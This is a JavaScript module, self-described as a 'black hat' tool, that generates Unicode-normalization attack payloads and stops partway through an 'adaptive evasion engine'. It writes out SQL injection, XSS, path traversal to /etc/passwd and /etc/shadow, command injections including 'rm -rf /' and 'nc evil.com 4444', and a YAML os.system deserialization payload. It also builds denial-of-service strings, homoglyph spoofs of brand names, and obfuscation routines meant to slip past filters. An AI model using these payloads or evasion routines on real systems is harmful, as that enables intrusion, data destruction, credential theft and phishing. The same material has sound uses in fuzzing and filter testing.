// adversarialPayloadGenerator.mjs

/**
 * @fileoverview A payload generator for advanced Unicode normalization vulnerabilities.
 * This tool creates sophisticated, weaponized inputs for fuzzing security-hardened
 * normalization libraries. The goal is to bypass filters, trigger resource exhaustion,
 * and create parser confusion in downstream systems.
 *
 * For black hat security testing. Handle with care.
 *
 * @module adversarialPayloadGenerator
 */

// --- Character Sets for Attacks ---

// Characters for Protocol Smuggling (HostSplit/HostBond style attacks)
// These normalize to ASCII characters with syntactic meaning in URLs, SQL, HTML, etc.
const PROTOCOL_SMUGGLING_CHARS = {
  '/': '\uFF0F', // FULLWIDTH SOLIDUS
  '?': '\uFF1F', // FULLWIDTH QUESTION MARK
  '#': '\uFF03', // FULLWIDTH NUMBER SIGN
  '@': '\uFF20', // FULLWIDTH COMMERCIAL AT
  '\\': '\uFF3C', // FULLWIDTH REVERSE SOLIDUS
  '\'': '\uFF07', // FULLWIDTH APOSTROPHE
  '<': '\uFE64', // SMALL LESS-THAN SIGN
  '>': '\uFE65', // SMALL GREATER-THAN SIGN
  ':': '\uFF1A', // FULLWIDTH COLON
  ';': '\uFF1B', // FULLWIDTH SEMICOLON
  '|': '\uFF5C', // FULLWIDTH VERTICAL LINE
  '&': '\uFF06', // FULLWIDTH AMPERSAND
  '$': '\uFF04', // FULLWIDTH DOLLAR SIGN
  '(': '\uFF08', // FULLWIDTH LEFT PARENTHESIS
  ')': '\uFF09', // FULLWIDTH RIGHT PARENTHESIS
  '.': '\uFF0E', // FULLWIDTH FULL STOP
  '!': '\uFF01', // FULLWIDTH EXCLAMATION MARK
  '{': '\uFF5B', // FULLWIDTH LEFT CURLY BRACKET
  '}': '\uFF5D', // FULLWIDTH RIGHT CURLY BRACKET
};

// Characters for Tokenizer Confusion (Invisible characters for splitting tokens)
const INVISIBLE_TOKEN_SPLITTERS = [
  '\u200B', // Zero-Width Space
  '\u200C', // Zero-Width Non-Joiner
  '\u200D', // Zero-Width Joiner
  '\u2060', // Word Joiner
  '\u180E', // Mongolian Vowel Separator
  '\uFEFF', // Zero Width No-Break Space
  '\u00AD', // Soft Hyphen
];

// Common homoglyphs for confusing tokenizers and humans
const HOMOGLYPH_MAP = {
  'a': 'а', // Latin 'a' -> Cyrillic 'а' (U+0430)
  'e': 'е', // Latin 'e' -> Cyrillic 'е' (U+0435)
  'o': 'о', // Latin 'o' -> Cyrillic 'о' (U+043E)
  'c': 'с', // Latin 'c' -> Cyrillic 'с' (U+0441)
  'p': 'р', // Latin 'p' -> Cyrillic 'р' (U+0440)
  'i': 'і', // Latin 'i' -> Cyrillic 'і' (U+0456)
  'l': 'І', // Latin 'l' -> Cyrillic 'І' (U+0406)
  'A': 'Α', // Latin 'A' -> Greek 'Α' (U+0391)
  'B': 'Β', // Latin 'B' -> Greek 'Β' (U+0392)
  'E': 'Ε', // Latin 'E' -> Greek 'Ε' (U+0395)
  'H': 'Η', // Latin 'H' -> Greek 'Η' (U+0397)
  'I': 'Ι', // Latin 'I' -> Greek 'Ι' (U+0399)
  'K': 'Κ', // Latin 'K' -> Greek 'Κ' (U+039A)
  'M': 'Μ', // Latin 'M' -> Greek 'Μ' (U+039C)
  'N': 'Ν', // Latin 'N' -> Greek 'Ν' (U+039D)
  'O': 'Ο', // Latin 'O' -> Greek 'Ο' (U+039F)
  'P': 'Ρ', // Latin 'P' -> Greek 'Ρ' (U+03A1)
  'T': 'Τ', // Latin 'T' -> Greek 'Τ' (U+03A4)
  'X': 'Χ', // Latin 'X' -> Greek 'Χ' (U+03A7)
  'Y': 'Υ', // Latin 'Y' -> Greek 'Υ' (U+03A5)
  'Z': 'Ζ', // Latin 'Z' -> Greek 'Ζ' (U+0396)
};

// Characters for triggering large expansions (DoS attacks)
const EXPANSION_CHARS = {
  highRatio: '\uFDFA', // ARABIC LIGATURE SALLALLAHOU ALAYHE WASALLAM (expands to 18 chars)
  combining: '\u0301', // COMBINING ACUTE ACCENT
  decomposable: 'Å', // A + combining ring
  complexLigature: '\uFB2A', // HEBREW LETTER SHIN WITH SHIN DOT
  mathScript: '𝒜', // MATHEMATICAL SCRIPT CAPITAL A
  fullWidth: 'Ａ', // FULLWIDTH LATIN CAPITAL LETTER A
};

// Characters that normalize to the same canonical form (collision targets)
const CANONICAL_COLLISION_PAIRS = [
  // Roman numerals vs Latin letters
  { legit: 'Ⅰ', evil: 'I' },      // U+2160 -> U+0049
  { legit: 'Ⅴ', evil: 'V' },      // U+2164 -> U+0056
  { legit: 'Ⅹ', evil: 'X' },      // U+2169 -> U+0058
  { legit: 'Ⅼ', evil: 'L' },      // U+216C -> U+004C
  { legit: 'Ⅽ', evil: 'C' },      // U+216D -> U+0043
  { legit: 'Ⅾ', evil: 'D' },      // U+216E -> U+0044
  { legit: 'Ⅿ', evil: 'M' },      // U+216F -> U+004D
  
  // Ligatures vs separate characters
  { legit: 'ﬁ', evil: 'fi' },     // U+FB01 -> f + i
  { legit: 'ﬂ', evil: 'fl' },     // U+FB02 -> f + l
  { legit: 'ﬀ', evil: 'ff' },     // U+FB00 -> f + f
  { legit: 'ﬃ', evil: 'ffi' },    // U+FB03 -> f + f + i
  { legit: 'ﬄ', evil: 'ffl' },    // U+FB04 -> f + f + l
  
  // Mathematical vs regular letters
  { legit: '𝐀', evil: 'A' },      // U+1D400 -> U+0041
  { legit: '𝐁', evil: 'B' },      // U+1D401 -> U+0042
  { legit: '𝒜', evil: 'A' },      // U+1D49C -> U+0041
  
  // Ohm sign vs Omega
  { legit: 'Ω', evil: 'Ω' },      // U+2126 -> U+03A9
  
  // Angstrom vs A with ring
  { legit: 'Å', evil: 'Å' },      // U+212B -> U+00C5
];

/**
 * Generates payloads for Normalization Arbitrage attacks (TOCTOU).
 * These payloads are designed to be interpreted differently by NFC vs. NFKC normalizers,
 * allowing bypasses in multi-stage validation pipelines.
 * @returns {string[]} An array of malicious strings.
 */
export function generateNormalizationArbitragePayloads() {
  const payloads = [
    'ﬁle.txt', // U+FB01 (fi ligature) -> "file.txt" in NFKC, bypasses filters for "file"
    'conﬁg.json', // config with fi ligature
    '㎒', // U+3392 (MHz) -> "MHz" in NFKC, hides keywords
    '№1', // U+2116 (NUMERO SIGN) -> "No.1" in NFKC
    'OhmΩ', // U+2126 (OHM SIGN) -> U+03A9 (OMEGA) in NFKC
    'Ⅸ', // U+2168 (ROMAN NUMERAL NINE) -> "IX" in NFKC
    '½', // U+00BD (VULGAR FRACTION ONE HALF) -> "1/2" in NFKC
    '㍿', // U+337F (SQUARE CORPORATION) -> "(株)" in NFKC
    'ℌ', // U+210C (BLACK-LETTER CAPITAL H) -> "H" in NFKC
    'ℑ', // U+2111 (BLACK-LETTER CAPITAL I) -> "I" in NFKC
    'ℜ', // U+211C (BLACK-LETTER CAPITAL R) -> "R" in NFKC
    '℻', // U+213B (FACSIMILE SIGN) -> "FAX" in NFKC
    '℡', // U+2121 (TELEPHONE SIGN) -> "TEL" in NFKC
    '™', // U+2122 (TRADE MARK SIGN) -> "TM" in NFKC
  ];
  return payloads.map(p => `prefix-${p}-suffix`);
}

/**
 * Generates payloads for Protocol Smuggling attacks (HostSplit/HostBond).
 * These introduce protocol-significant characters AFTER normalization,
 * causing parser confusion in downstream systems like URL parsers and SQL interpreters.
 * @returns {object[]} An array of objects describing the attack type and payload.
 */
export function generateProtocolSmugglingPayloads() {
  return [
    // URL Parser Confusion (HostSplit)
    {
      type: 'URL_HOST_SPLIT',
      description: 'Injects a normalized "/" to split a hostname into host + path.',
      payload: `www.google.com${PROTOCOL_SMUGGLING_CHARS['/']}evil.com`,
      expected: 'www.google.com/evil.com',
    },
    {
      type: 'URL_QUERY_INJECTION',
      description: 'Injects a normalized "?" to turn part of a host into a query string.',
      payload: `www.google.com${PROTOCOL_SMUGGLING_CHARS['?']}q=evil`,
      expected: 'www.google.com?q=evil',
    },
    {
      type: 'URL_AUTH_BYPASS',
      description: 'Injects a normalized "@" to bypass hostname validation.',
      payload: `safe.com${PROTOCOL_SMUGGLING_CHARS['@']}evil.com`,
      expected: 'safe.com@evil.com',
    },
    {
      type: 'URL_FRAGMENT_INJECTION',
      description: 'Injects a normalized "#" to create fragment confusion.',
      payload: `example.com${PROTOCOL_SMUGGLING_CHARS['#']}evil`,
      expected: 'example.com#evil',
    },
    {
      type: 'URL_PORT_CONFUSION',
      description: 'Injects a normalized ":" for port confusion.',
      payload: `example.com${PROTOCOL_SMUGGLING_CHARS[':']}8080`,
      expected: 'example.com:8080',
    },
    
    // SQL Injection via Normalization
    {
      type: 'SQLI_BYPASS_QUOTE',
      description: 'Uses a full-width apostrophe to bypass simple quote filtering.',
      payload: `admin${PROTOCOL_SMUGGLING_CHARS["'"]} OR 1=1--`,
      expected: "admin' OR 1=1--",
    },
    {
      type: 'SQLI_BYPASS_SEMICOLON',
      description: 'Uses full-width semicolon for command separation.',
      payload: `DROP TABLE users${PROTOCOL_SMUGGLING_CHARS[';']} --`,
      expected: 'DROP TABLE users; --',
    },
    
    // XSS via Normalization
    {
      type: 'XSS_BYPASS_SCRIPT',
      description: 'Uses small-variant less-than/greater-than to bypass HTML filtering.',
      payload: `${PROTOCOL_SMUGGLING_CHARS['<']}script${PROTOCOL_SMUGGLING_CHARS['>']}alert('XSS')${PROTOCOL_SMUGGLING_CHARS['<']}/script${PROTOCOL_SMUGGLING_CHARS['>']}`,
      expected: '<script>alert(\'XSS\')</script>',
    },
    {
      type: 'XSS_BYPASS_IMG',
      description: 'Creates img tag with event handler.',
      payload: `${PROTOCOL_SMUGGLING_CHARS['<']}img src=x onerror=alert(1)${PROTOCOL_SMUGGLING_CHARS['>']}`,
      expected: '<img src=x onerror=alert(1)>',
    },
    
    // Command Injection via Normalization
    {
      type: 'CMD_INJECTION_SEMICOLON',
      description: 'Uses full-width semicolon for command separation.',
      payload: `legit_argument${PROTOCOL_SMUGGLING_CHARS[';']} rm -rf /`,
      expected: 'legit_argument; rm -rf /',
    },
    {
      type: 'CMD_INJECTION_PIPE',
      description: 'Uses full-width pipe for command chaining.',
      payload: `input${PROTOCOL_SMUGGLING_CHARS['|']} cat /etc/passwd`,
      expected: 'input| cat /etc/passwd',
    },
    {
      type: 'CMD_INJECTION_AMPERSAND',
      description: 'Uses full-width ampersand for background execution.',
      payload: `input${PROTOCOL_SMUGGLING_CHARS['&']} nc evil.com 4444`,
      expected: 'input& nc evil.com 4444',
    },
    {
      type: 'CMD_INJECTION_DOLLAR',
      description: 'Uses full-width dollar for variable expansion.',
      payload: `input${PROTOCOL_SMUGGLING_CHARS['$']}(whoami)`,
      expected: 'input$(whoami)',
    },
    
    // Path Traversal via Normalization
    {
      type: 'PATH_TRAVERSAL_DOTDOT',
      description: 'Uses full-width dots and slashes for path traversal.',
      payload: `${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['/']}etc${PROTOCOL_SMUGGLING_CHARS['/']}passwd`,
      expected: '../etc/passwd',
    },
    {
      type: 'PATH_TRAVERSAL_BACKSLASH',
      description: 'Uses full-width backslashes for Windows path traversal.',
      payload: `${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['\\']}windows${PROTOCOL_SMUGGLING_CHARS['\\']}system32`,
      expected: '..\\windows\\system32',
    },
  ];
}

/**
 * Generates payloads designed to confuse tokenizers in LLMs and other NLP systems.
 * Uses invisible characters to split tokens and homoglyphs to create visual ambiguity.
 * @returns {string[]} An array of malicious strings.
 */
export function generateTokenizerConfusionPayloads() {
  const sensitiveKeywords = [
    'password', 'creditcard', 'secret', 'admin_token', 'api_key',
    'private_key', 'access_token', 'session_id', 'csrf_token',
    'authentication', 'authorization', 'credentials', 'login',
    'username', 'email', 'ssn', 'social_security', 'bank_account'
  ];
  const payloads = [];

  // 1. Invisible Token Splitting
  for (const keyword of sensitiveKeywords) {
    const splitPoint = Math.floor(keyword.length / 2);
    for (const splitter of INVISIBLE_TOKEN_SPLITTERS) {
      payloads.push(keyword.slice(0, splitPoint) + splitter + keyword.slice(splitPoint));
    }
    // Multiple invisible chars
    payloads.push(keyword.split('').join('\u200B')); // Zero-width space between every char
    payloads.push(keyword.split('').join('\u200C')); // Zero-width non-joiner between every char
  }

  // 2. Homoglyph Token Confusion - Common brands and services
  const homoglyphTargets = [
    'paypal', 'google', 'microsoft', 'amazon', 'facebook', 'apple',
    'netflix', 'spotify', 'github', 'stackoverflow', 'linkedin',
    'twitter', 'instagram', 'youtube', 'gmail', 'outlook'
  ];
  
  for (const target of homoglyphTargets) {
    let homoglyphVersion = target;
    for (const [latin, cyrillic] of Object.entries(HOMOGLYPH_MAP)) {
      homoglyphVersion = homoglyphVersion.replace(new RegExp(latin, 'gi'), cyrillic);
    }
    if (homoglyphVersion !== target) {
      payloads.push(homoglyphVersion);
    }
    
    // Mixed homoglyphs - replace only some characters
    const mixedVersion = target.split('').map((char, idx) => {
      if (HOMOGLYPH_MAP[char] && idx % 2 === 0) {
        return HOMOGLYPH_MAP[char];
      }
      return char;
    }).join('');
    if (mixedVersion !== target) {
      payloads.push(mixedVersion);
    }
  }

  // 3. Combining Character Confusion
  const combiningChars = ['\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307'];
  for (const keyword of sensitiveKeywords.slice(0, 5)) { // Limit to avoid too many
    for (const combiner of combiningChars) {
      payloads.push(keyword + combiner); // Add combining char at end
      payloads.push(keyword.charAt(0) + combiner + keyword.slice(1)); // Add in middle
    }
  }

  return payloads;
}

/**
 * Generates payloads for Resource Exhaustion (DoS) attacks.
 * Creates inputs that are computationally expensive or expand significantly in memory.
 * @returns {(string|object)[]} An array of malicious strings and objects.
 */
export function generateResourceExhaustionPayloads() {
  const payloads = [];

  // 1. Expansion Bomb (Memory DoS) - "Unicode Bomb"
  // A single high-ratio character repeated.
  payloads.push({
    type: 'DOS_EXPANSION_BOMB',
    description: 'Repeats a high-expansion character to exhaust memory.',
    payload: EXPANSION_CHARS.highRatio.repeat(50), // 50 * 18 = 900 chars on output
  });

  // 2. Algorithmic Complexity Bomb (CPU DoS) - "Billion Laughs" style
  // Many combining characters on a single base character.
  payloads.push({
    type: 'DOS_CPU_COMBINING',
    description: 'Chains hundreds of combining characters to stress the normalization algorithm.',
    payload: 'a' + EXPANSION_CHARS.combining.repeat(400),
  });

  // 3. Recursive Decomposition Bomb (CPU DoS)
  // A string of characters that all decompose, stressing the algorithm.
  function createComplexityBomb(depth) {
    if (depth <= 0) return EXPANSION_CHARS.decomposable;
    return createComplexityBomb(depth - 1).repeat(2);
  }
  payloads.push({
    type: 'DOS_CPU_RECURSIVE',
    description: 'Creates a deeply nested decomposable string for exponential complexity.',
    payload: createComplexityBomb(6), // depth=6 creates 2^6 = 64 chars
  });

  // 4. Mixed Complex Characters Bomb
  const complexChars = Object.values(EXPANSION_CHARS);
  payloads.push({
    type: 'DOS_MIXED_COMPLEX',
    description: 'Combines multiple types of complex characters.',
    payload: complexChars.join('').repeat(20),
  });

  // 5. Long String with High Combining Density
  payloads.push({
    type: 'DOS_HIGH_DENSITY_COMBINING',
    description: 'Long string with high density of combining characters.',
    payload: 'abcdefghijklmnopqrstuvwxyz'.split('').map(char => 
      char + '\u0300\u0301\u0302\u0303\u0304\u0305'
    ).join('').repeat(10),
  });

  // 6. Mathematical Script Bomb
  payloads.push({
    type: 'DOS_MATHEMATICAL_SCRIPT',
    description: 'Long string of mathematical script characters.',
    payload: '𝒜𝒷𝒸𝒹ℯ𝒻ℊ𝒽𝒾𝒿𝓀𝓁𝓂𝓃ℴ𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏'.repeat(50),
  });

  // 7. Circular Reference (DoS for serialization)
  const circularObj = {};
  circularObj.a = { b: circularObj };
  payloads.push({
    type: 'DOS_SERIALIZATION_CIRCULAR',
    description: 'A circular object reference to test for infinite loops in serialization.',
    payload: circularObj,
  });

  // 8. Deeply Nested Object
  let deepObj = {};
  let current = deepObj;
  for (let i = 0; i < 100; i++) {
    current.next = {};
    current = current.next;
  }
  current.value = 'deep';
  payloads.push({
    type: 'DOS_SERIALIZATION_DEEP',
    description: 'Deeply nested object to stress serialization.',
    payload: deepObj,
  });

  // 9. Array with Many References
  const largeArray = new Array(1000).fill(null).map((_, i) => ({ id: i, data: 'x'.repeat(100) }));
  payloads.push({
    type: 'DOS_SERIALIZATION_LARGE_ARRAY',
    description: 'Large array to stress serialization.',
    payload: largeArray,
  });

  return payloads;
}

/**
 * Generates payloads for Cryptographic Collision attacks.
 * Creates pairs of different strings that normalize to the same canonical form.
 * @returns {object[]} An array of collision pair objects.
 */
export function generateCryptographicCollisionPayloads() {
  const payloads = [];

  // Add all the predefined collision pairs
  for (const pair of CANONICAL_COLLISION_PAIRS) {
    payloads.push({
      type: 'CRYPTO_COLLISION_CANONICAL',
      description: `Canonical collision between '${pair.legit}' and '${pair.evil}'`,
      legit: pair.legit,
      evil: pair.evil,
    });
  }

  // Generate context-aware collision payloads
  const contexts = ['user', 'admin', 'config', 'file', 'token', 'key'];
  for (const context of contexts) {
    for (const pair of CANONICAL_COLLISION_PAIRS.slice(0, 5)) { // Limit to avoid explosion
      payloads.push({
        type: 'CRYPTO_COLLISION_CONTEXTUAL',
        description: `Contextual collision for ${context}`,
        legit: `${context}-${pair.legit}`,
        evil: `${context}-${pair.evil}`,
      });
    }
  }

  // Version number collisions
  payloads.push({
    type: 'CRYPTO_COLLISION_VERSION',
    description: 'Version collision using Roman numerals',
    legit: 'version-Ⅱ.Ⅰ.Ⅴ', // II.I.V
    evil: 'version-II.I.V',
  });

  // File extension collisions
  payloads.push({
    type: 'CRYPTO_COLLISION_FILE_EXT',
    description: 'File extension collision using ligatures',
    legit: 'document.ﬁle', // fi ligature
    evil: 'document.file',
  });

  return payloads;
}

/**
 * Generates payloads for Filesystem and Shell Injection attacks.
 * @returns {object[]} An array of injection payload objects.
 */
export function generateFilesystemInjectionPayloads() {
  return [
    // Path Traversal Attacks
    {
      type: 'FS_PATH_TRAVERSAL_UNIX',
      description: 'Unix path traversal using full-width characters',
      payload: `${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['/']}etc${PROTOCOL_SMUGGLING_CHARS['/']}passwd`,
      expected: '../etc/passwd',
    },
    {
      type: 'FS_PATH_TRAVERSAL_WINDOWS',
      description: 'Windows path traversal using full-width characters',
      payload: `${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['\\']}windows${PROTOCOL_SMUGGLING_CHARS['\\']}system32`,
      expected: '..\\windows\\system32',
    },
    {
      type: 'FS_PATH_TRAVERSAL_DEEP',
      description: 'Deep path traversal',
      payload: Array(10).fill(`${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['.']}${PROTOCOL_SMUGGLING_CHARS['/']}`).join('') + 'etc/shadow',
      expected: '../'.repeat(10) + 'etc/shadow',
    },

    // Command Injection Attacks
    {
      type: 'CMD_INJECTION_SEMICOLON',
      description: 'Command injection using semicolon',
      payload: `filename${PROTOCOL_SMUGGLING_CHARS[';']} rm -rf /tmp/*`,
      expected: 'filename; rm -rf /tmp/*',
    },
    {
      type: 'CMD_INJECTION_BACKTICK',
      description: 'Command injection using backtick substitution',
      payload: `file\`whoami\`.txt`,
      expected: 'file`whoami`.txt',
    },
    {
      type: 'CMD_INJECTION_SUBSHELL',
      description: 'Command injection using subshell',
      payload: `file${PROTOCOL_SMUGGLING_CHARS['$']}${PROTOCOL_SMUGGLING_CHARS['(']}id${PROTOCOL_SMUGGLING_CHARS[')']}`,
      expected: 'file$(id)',
    },

    // Special File Names
    {
      type: 'FS_SPECIAL_NAMES',
      description: 'Special device files and names',
      payload: '/dev/null',
      expected: '/dev/null',
    },
    {
      type: 'FS_WINDOWS_RESERVED',
      description: 'Windows reserved file names',
      payload: 'CON.txt',
      expected: 'CON.txt',
    },
  ];
}

/**
 * Generates payloads for Deserialization Poisoning attacks.
 * @returns {object[]} An array of deserialization payload objects.
 */
export function generateDeserializationPoisoningPayloads() {
  return [
    // YAML Object Instantiation
    {
      type: 'YAML_OBJECT_INSTANTIATION',
      description: 'YAML payload that could instantiate dangerous objects',
      payload: `test: ${PROTOCOL_SMUGGLING_CHARS['!']}${PROTOCOL_SMUGGLING_CHARS['!']}python/object/apply${PROTOCOL_SMUGGLING_CHARS[':']}os.system`,
      expected: 'test: !!python/object/apply:os.system',
    },

    // JSON Structure Confusion
    {
      type: 'JSON_STRUCTURE_BREAK',
      description: 'Breaks JSON structure with injected quotes and braces',
      payload: `value${PROTOCOL_SMUGGLING_CHARS['"']}${PROTOCOL_SMUGGLING_CHARS[',']}${PROTOCOL_SMUGGLING_CHARS['"']}admin${PROTOCOL_SMUGGLING_CHARS['"']}${PROTOCOL_SMUGGLING_CHARS[':']}true`,
      expected: 'value","admin":true',
    },

    // XML Entity Injection
    {
      type: 'XML_ENTITY_INJECTION',
      description: 'XML entity injection attempt',
      payload: `${PROTOCOL_SMUGGLING_CHARS['&']}lt${PROTOCOL_SMUGGLING_CHARS[';']}script${PROTOCOL_SMUGGLING_CHARS['&']}gt${PROTOCOL_SMUGGLING_CHARS[';']}`,
      expected: '&lt;script&gt;',
    },

    // Configuration File Injection
    {
      type: 'CONFIG_INJECTION_INI',
      description: 'INI file section injection',
      payload: `value\n[admin]\npassword=hacked`,
      expected: 'value\n[admin]\npassword=hacked',
    },

    // Properties File Injection
    {
      type: 'CONFIG_INJECTION_PROPERTIES',
      description: 'Properties file injection',
      payload: `value\nadmin.access=true\n`,
      expected: 'value\nadmin.access=true\n',
    },
  ];
}

/**
 * Generates payloads for JIT Engine and Environment-Specific attacks.
 * @returns {object[]} An array of JIT attack payload objects.
 */
export function generateJITEnginePayloads() {
  const payloads = [];

  // 1. The "Monster Mash" - Extremely long, complex strings
  const monsterComponents = [
    'ASCII_TEXT',
    'Α', // Greek
    '\u200B', // Invisible
    'а', // Cyrillic
    '\u0301', // Combining
    EXPANSION_CHARS.decomposable,
    EXPANSION_CHARS.highRatio,
    '𝒜', // Mathematical
    'ﬁ', // Ligature
  ];

  // Create patterns that interleave all attack vectors
  const monsterPattern = monsterComponents.join('');
  payloads.push({
    type: 'JIT_MONSTER_MASH_SMALL',
    description: 'Small monster pattern for JIT stress testing',
    payload: monsterPattern.repeat(100),
  });

  payloads.push({
    type: 'JIT_MONSTER_MASH_MEDIUM',
    description: 'Medium monster pattern for JIT stress testing',
    payload: monsterPattern.repeat(1000),
  });

  payloads.push({
    type: 'JIT_MONSTER_MASH_LARGE',
    description: 'Large monster pattern for JIT stress testing (use with caution)',
    payload: monsterPattern.repeat(5000),
  });

  // 2. Repetitive Pattern Attack (Hot Path Optimization Target)
  const hotPathPattern = 'a\u0301b\u0302c\u0303'; // Base chars with different combiners
  payloads.push({
    type: 'JIT_HOT_PATH_PATTERN',
    description: 'Repetitive pattern designed to trigger JIT optimization',
    payload: hotPathPattern.repeat(2000),
  });

  // 3. Edge Case Character Sequences
  payloads.push({
    type: 'JIT_EDGE_CASE_SEQUENCE',
    description: 'Sequence of edge-case Unicode characters',
    payload: '\uFFFF\u0000\uFFFE\u0001\uFFFD\u0002'.repeat(1000),
  });

  // 4. Surrogate Pair Stress Test
  // High and low surrogate pairs
  payloads.push({
    type: 'JIT_SURROGATE_PAIRS',
    description: 'Long sequence of surrogate pairs',
    payload: '𝒜𝒷𝒸𝒹ℯ𝒻ℊ𝒽𝒾𝒿𝓀𝓁𝓂𝓃ℴ𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏'.repeat(1000),
  });

  // 5. Memory Boundary Test
  // Strings designed to test memory boundary conditions
  const boundaryPattern = 'x'.repeat(65535); // Just under 64KB
  payloads.push({
    type: 'JIT_MEMORY_BOUNDARY',
    description: 'String at memory boundary to test allocation edge cases',
    payload: boundaryPattern + '\u0301',
  });

  return payloads;
}

/**
 * A master function to generate all types of adversarial payloads.
 * @returns {object[]} An array of all generated payloads with their types.
 */
export function generateAllPayloads() {
  const allPayloads = [
    ...generateNormalizationArbitragePayloads().map(p => ({ 
      type: 'NORMALIZATION_ARBITRAGE', 
      payload: p,
      description: 'Normalization arbitrage attack'
    })),
    ...generateProtocolSmugglingPayloads(),
    ...generateTokenizerConfusionPayloads().map(p => ({ 
      type: 'TOKENIZER_CONFUSION', 
      payload: p,
      description: 'Tokenizer confusion attack'
    })),
    ...generateResourceExhaustionPayloads(),
    ...generateCryptographicCollisionPayloads(),
    ...generateFilesystemInjectionPayloads(),
    ...generateDeserializationPoisoningPayloads(),
    ...generateJITEnginePayloads(),
  ];
  return allPayloads;
}

/**
 * Generates a comprehensive test report of all payloads by category.
 * @returns {object} A structured report of all payload categories.
 */
export function generatePayloadReport() {
  const report = {
    summary: {
      totalPayloads: 0,
      categories: {},
    },
    payloads: {},
  };

  const allPayloads = generateAllPayloads();
  report.summary.totalPayloads = allPayloads.length;

  // Group by type
  for (const payload of allPayloads) {
    if (!report.payloads[payload.type]) {
      report.payloads[payload.type] = [];
      report.summary.categories[payload.type] = 0;
    }
    report.payloads[payload.type].push(payload);
    report.summary.categories[payload.type]++;
  }

  return report;
}

// --- Export all functions for testing ---
export {
  PROTOCOL_SMUGGLING_CHARS,
  INVISIBLE_TOKEN_SPLITTERS,
  HOMOGLYPH_MAP,
  EXPANSION_CHARS,
  CANONICAL_COLLISION_PAIRS,
};

// 💀 EVIL BLACK HAT MUTATION ENGINES 😈

/**
 * ADAPTIVE EVASION ENGINE: Learns from blocked patterns and evolves
 * This is how real malware adapts to security systems!
 */
export function createAdaptiveEvasionEngine() {
  const blockedPatterns = new Set();
  const successfulEvasions = new Map();
  
  return {
    // Record when a pattern gets blocked
    recordBlocked(pattern) {
      blockedPatterns.add(pattern);
    },
    
    // Record successful evasion techniques
    recordSuccess(originalPattern, evasionTechnique) {
      if (!successfulEvasions.has(originalPattern)) {
        successfulEvasions.set(originalPattern, []);
      }
      successfulEvasions.get(originalPattern).push(evasionTechnique);
    },
    
    // Generate evolved payloads that avoid known blocks
    evolvePayload(basePayload) {
      let evolved = basePayload;
      
      // Apply multiple evasion layers
      evolved = this.applyUnicodeObfuscation(evolved);
      evolved = this.applyStructuralMutation(evolved);
      evolved = this.applyContextualCamouflage(evolved);
      
      return evolved;
    },
    
    // TECHNIQUE 1: Unicode Obfuscation Matrix
    applyUnicodeObfuscation(payload) {
      const techniques = [
        this.insertInvisibleChars,
        this.replaceWithHomoglyphs,
        this.addCombiningChars,
        this.useBidirectionalOverrides,
        this.injectZeroWidthSpaces
      ];
      
      // Randomly apply 2-4 techniques
      const numTechniques = 2 + Math.floor(Math.random() * 3);
      const selectedTechniques = techniques
        .sort(() => Math.random() - 0.5)
        .slice(0, numTechniques);
      
      return selectedTechniques.reduce((p, technique) => technique.call(this, p), payload);
    },
    
    // TECHNIQUE 2: Structural Mutation (DNA-style)
    applyStructuralMutation(payload) {
      const mutations = [
        this.duplicateAndScramble,
        this.insertDecoyPatterns,
        this.fragmentAndReassemble,
        this.embedInLegitimateContext,
        this.createPolymorphicVariant
      ];
      
      const mutation = mutations[Math.floor(Math.random() * mutations.length)];
      return mutation.call(this, payload);
    },
    
    // TECHNIQUE 3: Contextual Camouflage
    applyContextualCamouflage(payload) {
      const contexts = [
        this.disguiseAsConfiguration,
        this.mimicLegitimateUrl,
        this.embedInComment,
        this.hideInMetadata,
        this.wrapInEncodingLayer
      ];
      
      const context = contexts[Math.floor(Math.random() * contexts.length)];
      return context.call(this, payload);
    },
    
    // === OBFUSCATION TECHNIQUES ===
    
    insertInvisibleChars(payload) {
      const invisibles = ['\u200B', '\u200C', '\u200D', '\u2060', '\uFEFF'];
      let result = '';
      for (let i = 0; i < payload.length; i++) {
        result += payload[i];
        if (Math.random() < 0.3) {
          const invisible = invisibles[Math.floor(Math.random() * invisibles.length)];
          result += invisible;
        }
      }
      return result;
    },
    
    replaceWithHomoglyphs(payload) {
      const homoglyphMap = {
        'a': ['а', 'α', 'а'], // Cyrillic, Greek
        'o': ['о', 'ο', '᧐'], // Various o-like chars
        'e': ['е', 'ε', 'е'],
        'i': ['і', 'ι', 'і'],
        'p': ['р', 'ρ', 'р'],
        '0': ['О', 'Ο', '０'], // Zero vs O
        '1': ['Ⅰ', '𝟏', '１']
      };
      
      return payload.split('').map(char => {
        if (homoglyphMap[char.toLowerCase()] && Math.random() < 0.4) {
          const variants = homoglyphMap[char.toLowerCase()];
          return variants[Math.floor(Math.random() * variants.length)];
        }
        return char;
      }).join('');
    },
    
    addCombiningChars(payload) {
      const combinings = ['\u0301', '\u0302', '\u0303', '\u0304', '\u0308'];
      return payload.split('').map(char => {
        if (Math.random() < 0.2) {
          const combining = combinings[Math.floor(Math.random() * combinings.length)];
          return char + combining;
        }
        return char;
      }).join('');
    },
    
    useBidirectionalOverrides(payload) {
      const bidi = ['\u202D', '\u202E']; // LTR/RTL overrides
      const start = bidi[Math.floor(Math.random() * bidi.length)];
      return start + payload + '\u202C'; // Pop directional formatting
    },
    
    injectZeroWidthSpaces(payload) {
      // Strategic placement to break pattern recognition
      const positions = [0.25, 0.5, 0.75].map(p => Math.floor(payload.length * p));
      let result = payload;
      positions.reverse().forEach(pos => {
        result = result.slice(0, pos) + '\u200B' + result.slice(pos);
      });
      return result;
    },
    
    // === STRUCTURAL MUTATIONS ===
    
    duplicateAndScramble(payload) {
      // Create multiple copies with slight variations
      const copies = [];
      for (let i = 0; i < 3; i++) {
        let copy = payload;
        // Add random noise
